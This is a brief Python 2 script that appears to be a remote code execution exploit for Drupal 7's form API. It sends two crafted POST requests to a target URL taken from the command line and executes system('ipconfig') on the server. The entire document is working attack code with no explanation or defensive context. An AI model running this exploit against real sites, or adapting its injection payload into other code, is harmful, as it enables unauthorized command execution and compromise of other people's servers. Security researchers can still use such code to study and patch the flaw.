#coding: utf-8

import requests
import sys
import re

def code_exec(host, code):
    url1 = host + "?q=user/password&name[%23attached][assert][][]=$elements['%23children']%3d{}%3b".format(code)
    data = {
        "_triggering_element_name":"name",
        "form_id":"user_pass"
    }

    res = requests.post(url1, data=data).content

    form_buid_id = re.search(r"form_build_id\" value=\"(.+?)\"", res).group(1)
    print form_buid_id

    url2 = host + "?q=file/ajax/name/%23default_value/" + form_buid_id
    data2 = {
        "form_build_id":form_buid_id
    }

    res2 = requests.post(url2, data=data2).content
    print res2

if __name__ == '__main__':
    host = sys.argv[1]
    code_exec(host, "system('ipconfig')")